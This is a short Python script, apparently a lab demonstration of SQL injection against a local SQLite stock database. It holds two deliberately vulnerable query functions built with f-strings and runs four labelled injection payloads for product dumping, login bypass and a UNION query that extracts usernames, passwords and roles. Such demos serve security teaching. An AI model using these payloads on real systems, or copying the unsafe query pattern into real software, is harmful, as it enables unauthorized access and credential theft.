import sqlite3

conn = sqlite3.connect('nyondo_stock.db')

def search_product(name):
    # VULNERABLE: Using f-string directly in query
    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
    print(f'[QUERY] {query}')
    rows = conn.execute(query).fetchall()
    print(f'[RESULT] {rows}\n')
    return rows

def login(username, password):
    # VULNERABLE: Using f-string directly in query
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f'[QUERY] {query}')
    row = conn.execute(query).fetchone()
    print(f'[RESULT] {row}\n')
    return row

print("\n" + "=" * 60)
print("ATTACK 1: Dump all products using OR 1=1")
print("=" * 60)
search_product("' OR 1=1--")

print("\n" + "=" * 60)
print("ATTACK 2: Login bypass - comment out password check")
print("=" * 60)
login("admin'--", "anything")

print("\n" + "=" * 60)
print("ATTACK 3: Always true login")
print("=" * 60)
login("' OR '1'='1", "' OR '1'='1")

print("\n" + "=" * 60)
print("ATTACK 4: UNION attack - steal user credentials")
print("=" * 60)
search_product("' UNION SELECT id, username, password, role FROM users--")

conn.close()